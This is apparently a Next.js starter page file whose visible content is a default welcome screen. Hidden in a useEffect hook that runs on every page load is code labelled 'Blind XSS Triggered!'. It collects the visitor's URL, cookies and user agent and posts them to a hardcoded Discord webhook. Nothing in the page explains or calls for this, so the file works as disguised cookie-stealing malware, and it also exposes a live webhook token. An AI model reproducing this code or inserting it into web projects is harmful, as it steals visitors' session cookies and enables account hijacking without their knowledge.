import Head from 'next/head'
import { useEffect } from 'react'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  useEffect(() => {
    const webhook = "https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I";

    const payload = {
      content: `📢 Blind XSS Triggered!
🌐 URL: ${window.location.href}
🍪 Cookies: ${document.cookie}
🧠 User-Agent: ${navigator.userAgent}`,
    };

    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  }, []);

  return (
    <div className="container">
      <Head>
        <title>Next.js Starter!</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        <Header title="Welcome to my app!" />
        <p className="description">
          Get started by editing <code>pages/index.js</code>
        </p>
      </main>

      <Footer />
    </div>
  )
}

